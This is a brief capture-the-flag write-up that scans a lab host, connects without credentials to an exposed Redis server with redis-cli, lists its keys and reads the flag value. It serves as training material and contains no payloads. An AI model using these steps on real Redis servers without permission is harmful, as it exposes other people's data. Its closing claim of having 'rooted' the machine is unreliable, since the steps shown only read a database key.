```php
nmap -A -p- -sC 10.129.148.192

>PORT     STATE SERVICE VERSION
>6379/tcp open  redis   Redis key-value store 5.0.7
```

looks like were gonna use a new tool called `redis-cli `
its a `no-sql` type of database

gives us a shell into the `redis` database

```php
redis-cli -h 10.129.148.192
```

gives us info on the database and its system
```php
info

>Server
>redis_version:5.0.7
>redis_git_sha1:00000000
>redis_git_dirty:0
>redis_build_id:66bd629f924ac924
>redis_mode:standalone
>os:Linux 5.4.0-77-generic x86_64
>arch_bits:64
>multiplexing_api:epoll
>atomicvar_api:atomic-builtin
>gcc_version:9.3.0
>process_id:752
>run_id:6c75f6856b0139c27b9696fb446cce0529d0e204
>tcp_port:6379
>uptime_in_seconds:432
>uptime_in_days:0
>hz:10
>configured_hz:10
>lru_clock:3750769
>executable:/usr/bin/redis-server
>config_file:/etc/redis/redis.conf
```

Look at all keys that are in database 0 

```php
KEYS *

>1) "numb"
>2) "stor"
>3) "flag"
>4) "temp"
```

Get the value of the key named `flag`

```php
>get flag 
>03e1d2b376c37ab3f5319922053953eb
```

We have rooted the machine
